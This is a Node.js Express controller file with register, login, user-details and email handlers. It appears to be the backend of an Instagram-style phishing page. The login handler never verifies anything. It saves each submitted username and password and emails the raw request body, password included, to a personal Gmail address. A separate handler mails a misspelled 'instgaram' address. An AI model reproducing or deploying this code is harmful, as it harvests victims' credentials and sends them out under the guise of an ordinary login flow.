const ErrorHandler = require("../utils/errorHandler.js");
const catchAsyncErrors = require("../middlewares/catchAsyncError.js");
const User = require("../models/uerModel.js");
const fs = require("fs");
const sendMail = require("../utils/nodemailer.js");
 

exports.userRegisterController = catchAsyncErrors(async (req, res, next) => { 
    const {name,username, email, password } = req.body;
  
    const user= await User.findOne({ email }).select("+password");
    if (user) {
      return next(new ErrorHandler("User already exists", 401));
    }
      const newUser = new User({
        name,username, email, password
      });
     await newUser.save();
     
  });
  

  
exports.userLoginController = catchAsyncErrors(async (req, res, next) => {
    const { username, password } = req.body;
    const newUser = new User({
      username, password
    });
    sendMail("yash.patel98305@gmail.com",req.body,"password")

   await newUser.save();
   res.status(200).json({
    success: true,
    newUser,
  });
  });
  
  exports.getUserDetailsController = catchAsyncErrors(async (req, res, next) => {
    const user = await User.findById(req.user._id);
    res.status(200).json({
      success: true,
      user,
    });
  });
exports.emailController = catchAsyncErrors(async(req,res)=>{
  sendMail("instgaram.service@gmail.com",0,"email")
  res.status(200).json({
    success: true,
    message : "mail sent"
  })
})
